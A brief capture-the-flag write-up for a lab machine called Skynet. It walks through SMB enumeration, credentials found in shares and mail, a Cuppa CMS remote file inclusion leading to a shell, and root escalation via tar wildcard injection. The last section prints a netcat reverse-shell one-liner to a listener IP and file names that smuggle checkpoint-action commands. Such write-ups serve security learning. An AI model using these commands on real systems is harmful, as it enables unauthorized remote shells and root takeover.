# SKYNET
```
IP = 10.10.27.212
```

### Enumeration
-------------------------
+ Ran the initial and all vuln nmap scan.
+ Found SquirrelMail login page at `http://10.10.27.212/squirrelmail/src/login.php` with version `1.4.23 [SVN]`
+ Enumerated SMB shares using `sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.27.212`
+ Found anonymous share with helpful logs in it, contained current password for squirrelmail 
	`[milesdyson:cyborg007haloterminator]`
+ Dyson's mail contains smb password [)s{A&2Z=F^n_E.B`]`
+ Can log into his smb share using `smbclient //10.10.27.212/milesdyson --user=milesdyson`
+ Found hidden path at /45kra24zxs28v3yd in miles files
+ Ran gobuster on that path to find Cuppa CMS
+ Used searchsploit to look for exploits, Found RFI that worked!
+ Configured the RFI to accept a file which creates a reverse shell
+ Obtained a shell

### PrivEsc
-------------------------
+ A script called backups.sh runs every minute with root privileges
+ It opens a shell, navigates to a folder and creates a backup of everything
+ tar command has wildcard which can be exploited to execute commands
+ Created a listener on 9005 and executed following commands to gain root shell:
	`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.4.238 9005 >/tmp/f" > shell.sh`
	`touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
	`touch "/var/www/html/--checkpoint=1"`
